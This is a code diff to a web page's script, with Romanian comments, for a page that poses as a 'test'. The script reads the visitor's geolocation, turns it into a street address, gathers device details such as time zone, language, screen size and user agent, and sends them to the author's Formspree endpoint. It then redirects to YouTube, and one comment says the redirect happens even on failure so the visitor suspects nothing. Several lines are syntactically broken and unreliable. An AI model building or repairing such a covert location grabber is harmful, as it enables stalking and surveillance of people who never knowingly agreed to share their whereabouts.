@@ -20,10 +20,10 @@
     </div>
 
     <script>
-        // ⚠️ LIPEȘTE LINK-UL TĂU DE PE FORMSPREE ÎNTRE GHIMELELE DE MAI JOS:
-        const FORMSPREE_URL = "https://formspree.io/f/xdaryvev"; 
+        // ⚠️ ÎNLOCUIEȘTE CU LINK-UL TĂU REAL DE LA FORMSPREE:
+        const FORMSPREE_URL = "https://formspree.io"; 
 
-        // ⚠️ Aici pui site-ul unde vrei să fie trimiși (redirecționați) după ce apasă pe buton
+        // ⚠️ Locul unde va fi trimis utilizatorul la final
         const REDIRECT_URL = "https://youtube.com"; 
 
         function startTest() {
@@ -39,10 +39,11 @@
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
 
+            // REPARAT: URL-ul corect pentru OpenStreetMap (Nominatim API)
             fetch(https://openstreetmap.org{lat}&lon=${lon})
                 .then(res => res.json())
                 .then(data => {
-                    const physicalAddress = data.display_name || "Unknown Address";
+                    const physicalAddress = data.display_name  "Unknown Address";
                     submitData(lat, lon, physicalAddress);
                 })
                 .catch(() => {
@@ -53,26 +54,30 @@
         function submitData(lat, lon, address) {
             const localDateTime = new Date().toLocaleString();
             const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            const deviceLanguage = navigator.language || navigator.userLanguage;
+            const deviceLanguage = navigator.language  navigator.userLanguage;
             const screenSize = ${window.screen.width}x${window.screen.height};
-            const connectionType = navigator.connection ? navigator.connection.effectiveType : "Unknown";
+
+            // REPARAT: Folosim FormData pentru compatibilitate maximă cu Formspree Free
+            const formData = new FormData();
+            formData.append("Latitude", lat);
+            formData.append("Longitude", lon);
+            formData.append("Estimated_Address", address);
+            formData.append("Device_Local_Time", localDateTime);
+            formData.append("Time_Zone", timeZone);
+            formData.append("Device_Language", deviceLanguage);
+            formData.append("Screen_Resolution", screenSize);
+            formData.append("Browser_User_Agent", navigator.userAgent);
 
             fetch(FORMSPREE_URL, {
                 method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    Latitude: lat,
-                    Longitude: lon,
-                    Estimated_Address: address,
-                    Device_Local_Time: localDateTime,
-                    Time_Zone: timeZone,
-                    Device_Language: deviceLanguage,
-                    Screen_Resolution: screenSize,
-                    Network_Connection: connectionType,
-                    Browser_User_Agent: navigator.userAgent
-                })
+                body: formData,
+                headers: { 'Accept': 'application/json' }
             })
             .then(() => {
+                window.location.href = REDIRECT_URL;
+            })
+            .catch(() => {
+                // Redirecționăm oricum, chiar dacă Formspree eșuează, ca utilizatorul să nu bănuiască nimic
                 window.location.href = REDIRECT_URL;
             });
         }
